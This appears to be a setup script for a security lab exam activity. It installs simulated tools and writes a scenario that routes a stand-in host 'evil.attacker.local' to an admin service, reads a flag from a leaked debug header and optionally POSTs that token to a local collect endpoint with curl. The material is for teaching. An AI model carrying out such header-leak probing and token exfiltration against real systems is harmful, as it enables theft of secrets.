#!/bin/bash
# Activity 3 initialization
#!/bin/bash
set -euo pipefail

LAB_DIR="/home/labDirectory"
EVAL_DIR="/home/.evaluationScripts"

chmod 666 "$EVAL_DIR/evaluate.json" 2>/dev/null || true
touch "$LAB_DIR/SUBMIT_FLAG.txt"
echo "(Paste only the Activity 3 flag)" > "$LAB_DIR/SUBMIT_FLAG.txt"
chmod 666 "$LAB_DIR/SUBMIT_FLAG.txt"

cp "$EVAL_DIR/activityInitiator/runtime_stack.py" /usr/local/bin/runtime_stack.py
cp "$EVAL_DIR/activityInitiator/labfctl.sh" /usr/local/bin/labfctl
cp "$EVAL_DIR/activityInitiator/rebindctl.sh" /usr/local/bin/rebindctl
cp "$EVAL_DIR/activityInitiator/fetch_sim.sh" /usr/local/bin/fetch-sim
chmod +x /usr/local/bin/runtime_stack.py /usr/local/bin/labfctl /usr/local/bin/rebindctl /usr/local/bin/fetch-sim

LABF_ACTIVITY=3 /usr/local/bin/runtime_stack.py stop || true
LABF_ACTIVITY=3 /usr/local/bin/runtime_stack.py reset
LABF_ACTIVITY=3 /usr/local/bin/runtime_stack.py start

cat > "$LAB_DIR/SCENARIO.txt" << 'EOF'
Activity 3 (Exam): Hardened Service and Header Leak

1) Open browser UI: http://127.0.0.1:8080
2) Route evil host to hardened admin-b:
    labfctl set evil.attacker.local admin-b
3) Verify direct admin route is blocked:
    fetch-sim evil.attacker.local /admin
4) Probe alternative path and inspect headers:
    fetch-sim evil.attacker.local /healthz
5) Extract IITB{...} from `X-Debug-Token` header
6) Optional evidence collection:
    - labfctl logs proxy
    - curl -s -X POST http://127.0.0.1:8084/collect -d 'token=IITB{...}&source=exam'
7) Put the token into SUBMIT_FLAG.txt

No step-by-step exploit hints beyond this point.
EOF

echo "[+] Activity 3 initialized. Browser console: http://127.0.0.1:8080"
